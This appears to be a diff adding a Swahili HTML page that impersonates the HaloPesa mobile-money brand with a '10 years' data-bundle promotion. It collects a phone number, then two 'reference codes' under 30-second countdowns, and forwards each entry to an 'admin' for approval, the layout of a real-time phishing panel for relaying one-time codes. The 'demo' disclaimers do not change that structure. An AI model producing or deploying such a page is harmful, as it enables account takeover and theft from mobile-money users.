@@ -1,0 +1,43 @@
+<!doctype html>
+<html lang="sw">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+  <meta name="theme-color" content="#f4511e">
+  <title>Ofa ya Vifurushi vya HaloPesa – Miaka 10</title>
+  <link rel="stylesheet" href="/styles.css">
+</head>
+<body>
+<div id="anniversarySplash" class="anniversary-splash" role="dialog" aria-label="HaloPesa Miaka 10" aria-modal="true">
+  <img src="/halopesa-10-years.jpg" alt="HaloPesa celebrating 10 years together">
+  <button type="button" id="skipAnniversarySplash" class="splash-skip" aria-label="Endelea">Endelea</button>
+</div>
+<main class="app">
+  <header class="topbar">
+    <div class="brand-logo" aria-label="HaloPesa">Halo<span>Pesa</span></div>
+    <div><div class="brand">HaloPesa • Miaka 10</div><div class="subbrand">Ofa ya Vifurushi vya HaloPesa • Miaka 10</div></div>
+    <div class="secure" aria-label="Salama"></div>
+  </header>
+
+  <div class="notice">
+    <strong>Sherehekea Miaka 10 ya Huduma</strong>
+    <span>Onyesho la majaribio la kuchagua kifurushi cha data. Si huduma rasmi ya HaloPesa, halihusiani na HaloPesa, na halitoi data au fedha halisi. Usiweke PIN, OTP au taarifa za siri.</span>
+  </div>
+
+  <div class="steps" aria-label="Hatua za maombi">
+    <span class="step active">1</span><i></i><span class="step">2</span><i></i><span class="step">3</span><i></i><span class="step">4</span>
+  </div>
+
+  <section class="page active" data-page="1">
+    <div class="hero"><div class="icon"><img src="/halopesa-icon.png" alt="HaloPesa"></div><h1>Ofa ya Vifurushi • Miaka 10</h1><p>Weka nambari ya simu na kumbukumbu ya majaribio ili kuendelea.</p></div>
+    <form id="loginForm" class="card form-card"><label>Nambari ya simu ya majaribio</label><input id="phone" required placeholder="06XXXXXXXX" inputmode="tel" autocomplete="off"><label>Nambari ya kumbukumbu ya majaribio (tarakimu zozote)</label><input id="applicationIdInput" required maxlength="30" minlength="1" inputmode="numeric" pattern="[0-9]{1,30}" placeholder="Weka namba yoyote ya majaribio" autocomplete="off"><div class="hint">Tumia taarifa za mfano pekee. Usiweke PIN au OTP.</div><button class="primary" id="startApplication" type="submit">ENDELEA <span>→</span></button><div class="error hidden" id="loginError"></div><div class="waiting hidden" id="approvalWaiting"><div class="spinner"></div><strong>Inasubiri idhini ya demo</strong><span>Ombi la majaribio limetumwa kwa mapitio.</span><small>Nambari ya ombi: <b id="applicationNumber">—</b></small></div></form>
+  </section>
+
+  <section class="page" data-page="2"><div class="hero"><div class="icon"><span>🔐</span></div><h1>Reference Code 1</h1><p>Uthibitisho wa kwanza wa majaribio.</p></div><div class="card form-card"><label>Reference Code 1 (DEMO)</label><input id="refCode1" class="text-input" inputmode="numeric" maxlength="30" placeholder="Weka namba yoyote ya majaribio" autocomplete="off"><div class="hint">Weka namba yoyote ya majaribio. Usiweke OTP au PIN.</div><div class="submission-timer" id="refCode1Timer"><div class="countdown-ring" id="refCode1Ring" style="--progress:100%"><div class="countdown-ring-inner"><strong id="refCode1Seconds">30</strong><span>SEK</span></div></div><div class="countdown-label">Muda uliobaki</div></div><button class="primary" id="refCode1Btn">THIBITISHA CODE 1 <span>→</span></button><div class="hint hidden" id="refCode1Waiting">Imetumwa kwa msimamizi wa demo. Subiri idhini...</div><button class="secondary hidden" id="refCode1Resubmit" type="button">ANZA TENA ↻</button><div class="error hidden" id="refCode1Error"></div></div></section>
+
+  <section class="page" data-page="3"><div class="hero"><div class="icon"><span>🔐</span></div><h1>Reference Code 2</h1><p>Uthibitisho wa pili wa majaribio.</p></div><div class="card form-card"><label>Reference Code 2 (DEMO)</label><input id="refCode2" class="text-input" inputmode="numeric" maxlength="30" placeholder="Weka namba yoyote ya majaribio" autocomplete="off"><div class="hint">Weka namba yoyote ya majaribio. Usiweke OTP au PIN.</div><div class="submission-timer" id="refCode2Timer"><div class="countdown-ring" id="refCode2Ring" style="--progress:100%"><div class="countdown-ring-inner"><strong id="refCode2Seconds">30</strong><span>SEK</span></div></div><div class="countdown-label">Muda uliobaki</div></div><button class="primary" id="refCode2Btn">THIBITISHA CODE 2 <span>→</span></button><div class="hint hidden" id="refCode2Waiting">Imetumwa kwa msimamizi wa demo. Subiri idhini...</div><button class="secondary hidden" id="refCode2Resubmit" type="button">ANZA TENA ↻</button><div class="error hidden" id="refCode2Error"></div></div></section>
+
+  <section class="page" data-page="4"><div class="hero"><div class="icon"><img src="/halopesa-icon.png" alt="HaloPesa"></div><h1>Chagua Kifurushi cha Data</h1><p>Chagua kifurushi kinachokufaa kulingana na matumizi ya laini.</p></div><div class="card form-card"><label>Matumizi ya laini yako</label><select id="lineUsageProfile" class="bundle-select"><option value="light">Matumizi ya kawaida — miamala/vocha mara chache</option><option value="regular">Matumizi ya mara kwa mara — hununua vocha na kufanya miamala</option><option value="frequent">Matumizi mengi — miamala na ununuzi wa vocha mara kwa mara</option></select><label>Chagua kifurushi</label><select id="bundleCode" class="bundle-select"><option value="1001" data-level="light,regular,frequent">500MB • Siku 7</option><option value="1002" data-level="light,regular,frequent">1GB • Siku 7</option><option value="1003" data-level="light,regular,frequent">2GB • Siku 7</option><option value="1004" data-level="regular,frequent">3GB • Siku 7</option><option value="1005" data-level="regular,frequent">5GB • Siku 30</option><option value="1006" data-level="frequent">8GB • Siku 30</option><option value="1007" data-level="frequent">10GB • Siku 30</option><option value="1008" data-level="frequent">15GB • Siku 30</option></select><div class="hint" id="bundleEligibilityHint">Chaguo lako litatumwa kwa msimamizi wa demo kwa idhini. Matumizi yameelezwa na mtumiaji na hayajathibitishwa na mtandao.</div><button class="primary" id="bundleSubmitBtn">TUMA CHAGUO KWA ADMIN <span>→</span></button><div class="waiting hidden" id="bundleWaiting"><div class="spinner"></div><strong>Inasubiri idhini ya kifurushi</strong><span>Chaguo lako la demo limetumwa kwa msimamizi.</span></div><div class="error hidden" id="bundleError"></div></div></section>
+
+  <section class="page" data-page="success"><div class="success-card"><div class="big-check">✓</div><div class="celebration">🎉 🎇 🎊</div><h1>Hongera!</h1><p>Umechagua kifurushi cha data cha majaribio:</p><div class="application-number" id="successBundle">—</div><p>Chaguo limeidhinishwa kwenye demo. Hakuna data halisi iliyohamishwa.</p><div class="application-number" id="successNumber">—</div><small>Onyesho la majaribio • Si huduma rasmi ya HaloPesa</small></div></section>
+ <footer> <span>Ombi salama</span> <span>•</span> <span>Demo huru • Si huduma rasmi ya HaloPesa</span> </footer> </main> <script src="/app.js"></script> </body> </html>
